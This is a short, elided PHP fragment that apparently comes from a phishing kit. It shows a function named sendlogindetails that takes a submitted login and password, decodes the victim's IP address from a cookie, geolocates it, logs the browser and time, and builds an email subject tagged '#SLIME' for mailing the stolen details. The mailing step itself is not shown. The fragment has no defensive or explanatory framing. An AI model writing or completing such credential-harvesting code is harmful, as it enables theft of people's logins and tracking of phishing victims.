...
function sendlogindetails($login,$passwd,$to,$sub){
...
$ipcc = base64_decode($_COOKIE['ip']);
$ip = str_replace("z",".",$ipcc);
$geoplugin->locate($ip);
$inj = $_SERVER["REQUEST_URI"];
$browser = $_SERVER['HTTP_USER_AGENT'];
$server = date("D/M/d, Y g:i a");
// subject
$subject = "".$sub." Registration Details $ip {$geoplugin->countryName} #SLIME";
$atdomain = strstr($login, '@');
